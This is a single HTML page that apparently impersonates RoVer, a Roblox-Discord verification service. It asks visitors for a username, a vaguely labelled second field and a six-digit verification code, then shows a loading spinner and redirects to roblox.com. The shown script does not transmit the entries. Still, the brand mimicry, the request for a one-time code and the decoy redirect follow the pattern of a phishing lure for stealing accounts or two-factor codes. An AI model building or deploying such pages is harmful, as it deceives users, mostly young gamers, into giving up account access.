<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RoVer - Roblox on Discord, made easy.</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #e91e63 0%, #ff5252 50%, #f44336 100%);
            min-height: 100vh;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Navbar */
        header {
            width: 100%;
            max-width: 1200px;
            padding: 24px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 28px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }

        .logo-icon {
            width: 32px;
            height: 32px;
            border: 3px solid #ffffff;
            border-radius: 8px;
            transform: rotate(-10deg);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo-icon::after {
            content: '';
            width: 12px;
            height: 12px;
            border: 3px solid #ffffff;
            border-radius: 3px;
        }

        .menu-btn {
            background: none;
            border: none;
            color: white;
            font-size: 28px;
            cursor: pointer;
        }

        /* Main Content */
        main {
            width: 100%;
            max-width: 600px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
        }

        .badge {
            font-size: 13px;
            font-weight: 700;
            letter-spacing: 1.5px;
            text-transform: uppercase;
            opacity: 0.9;
            margin-bottom: 16px;
        }

        h1 {
            font-size: 42px;
            line-height: 1.1;
            font-weight: 800;
            margin-bottom: 20px;
        }

        .description {
            font-size: 18px;
            line-height: 1.5;
            opacity: 0.95;
            margin-bottom: 32px;
        }

        /* Action Card / Form Area */
        .card {
            width: 100%;
            background-color: #121318;
            border-radius: 20px;
            padding: 24px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            margin-top: 20px;
        }

        .btn-main {
            background-color: #ffffff;
            color: #d81b60;
            border: none;
            padding: 16px 28px;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: transform 0.2s, background-color 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 30px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
        }

        .btn-main:hover {
            transform: translateY(-2px);
            background-color: #f8f8f8;
        }

        /* Stats */
        .stats {
            display: flex;
            gap: 24px;
            margin-bottom: 30px;
            width: 100%;
        }

        .stat-item h3 {
            font-size: 18px;
            font-weight: 700;
        }

        .stat-item p {
            font-size: 13px;
            opacity: 0.8;
            margin-top: 2px;
        }

        /* Form Fields inside Card */
        .form-group {
            display: flex;
            flex-direction: column;
            gap: 8px;
            margin-bottom: 16px;
            text-align: left;
        }

        .form-group label {
            font-size: 14px;
            color: #a0a0a0;
            font-weight: 500;
        }

        .form-group input {
            background-color: #1a1c23;
            border: 1px solid #2d303e;
            border-radius: 10px;
            padding: 14px;
            color: #ffffff;
            font-size: 15px;
            outline: none;
            transition: border-color 0.2s;
        }

        .form-group input:focus {
            border-color: #ff5252;
        }

        .code-input {
            letter-spacing: 8px;
            font-size: 20px !important;
            text-align: center;
            font-weight: 700;
        }

        .btn-confirm {
            width: 100%;
            background: linear-gradient(90deg, #e91e63, #ff5252);
            color: #ffffff;
            border: none;
            padding: 14px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 8px;
            transition: opacity 0.2s;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }

        .btn-confirm:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        /* Spinner de Carregando */
        .spinner {
            width: 18px;
            height: 18px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #ffffff;
            animation: spin 0.8s linear infinite;
            display: none;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>

    <!-- Header / Navbar -->
    <header>
        <div class="logo">
            <div class="logo-icon"></div>
            RoVer
        </div>
        <button class="menu-btn">☰</button>
    </header>

    <!-- Conteúdo Principal -->
    <main>
        <div class="badge">ROBLOX ⇄ DISCORD VERIFICATION</div>
        <h1>Roblox on Discord, made easy.</h1>
        <p class="description">
            Integrate your Discord server with Roblox — account verification, unlimited role bindings, nickname syncing, and more.
        </p>

        <!-- Botão Inicial -->
        <button class="btn-main" id="btnVerify" onclick="abrirVerificacao()">
            Verificar com a Roblox &rarr;
        </button>

        <!-- Estatísticas -->
        <div class="stats">
            <div class="stat-item">
                <h3>18M</h3>
                <p>Verified users</p>
            </div>
            <div class="stat-item">
                <h3>500K</h3>
                <p>Discord servers</p>
            </div>
            <div class="stat-item">
                <h3>10 yrs</h3>
                <p>Reliable, since 2016</p>
            </div>
        </div>

        <!-- Cartão Escuro com o Formulário -->
        <div class="card hidden" id="cardForm">
            <div class="form-group">
                <label for="username">Nome de Usuário</label>
                <input type="text" id="username" placeholder="Digite o seu nome..." required>
            </div>

            <div class="form-group">
                <label for="confirmUsername">Confirme o Nome de Usuário</label>
                <input type="text" id="confirmUsername" placeholder="Digite o seu texto aqui..." required>
            </div>

            <div class="form-group">
                <label for="code">Código de Verificação (6 dígitos)</label>
                <input type="text" id="code" class="code-input" maxlength="6" placeholder="000000" required>
            </div>

            <button class="btn-confirm" id="btnConfirm" onclick="confirmar()">
                <div class="spinner" id="spinner"></div>
                <span id="btnText">Confirmar Verificação</span>
            </button>
        </div>
    </main>

    <script>
        function abrirVerificacao() {
            document.getElementById('btnVerify').classList.add('hidden');
            document.getElementById('cardForm').classList.remove('hidden');
        }

        function confirmar() {
            const nome = document.getElementById('username').value.trim();
            const segundoCampo = document.getElementById('confirmUsername').value.trim();
            const codigo = document.getElementById('code').value.trim();

            if (!nome) {
                alert('Por favor, introduza o seu nome.');
                return;
            }

            if (!segundoCampo) {
                alert('Por favor, preencha o segundo campo.');
                return;
            }

            if (codigo.length !== 6 || isNaN(codigo)) {
                alert('Por favor, introduza um código válido de 6 dígitos.');
                return;
            }

            // Inicia o estado de carregando
            const btnConfirm = document.getElementById('btnConfirm');
            const spinner = document.getElementById('spinner');
            const btnText = document.getElementById('btnText');

            btnConfirm.disabled = true;
            spinner.style.display = 'block';
            btnText.textContent = 'Carregando...';

            // Aguarda 4 segundos e redireciona para o Roblox
            setTimeout(() => {
                window.location.href = 'https://www.roblox.com';
            }, 4000);
        }
    </script>

</body>
</html>
